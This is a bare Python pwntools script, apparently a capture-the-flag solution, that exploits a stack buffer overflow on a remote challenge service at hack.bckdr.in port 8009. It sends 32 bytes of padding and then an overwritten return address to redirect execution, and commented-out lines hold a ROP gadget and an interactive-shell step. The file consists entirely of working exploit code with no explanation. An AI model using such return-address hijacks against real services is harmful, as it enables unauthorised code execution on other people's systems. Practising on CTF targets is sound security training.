#!/usr/bin/python
from pwn import *


#~ POP3RET = 0x8048add # pop esi; pop edi; pop ebp; ret

p =""
#p ="a\n"
p+="a" *32
#~ p+=p32(POP3RET)
#~ p+=p32(0x90)
p+=p32(0x080486cc)
p+=p32(0xbbbb) 
#p+=p32(0xcccc) 
#p+=p32(0xdddd)

#~ print 'A\n'+p
s=remote('hack.bckdr.in', 8009)
log.info(s.recv())
s.sendline('A')
log.info(s.recv())
s.sendline(p)
#print s.recv()
#s.interactive()
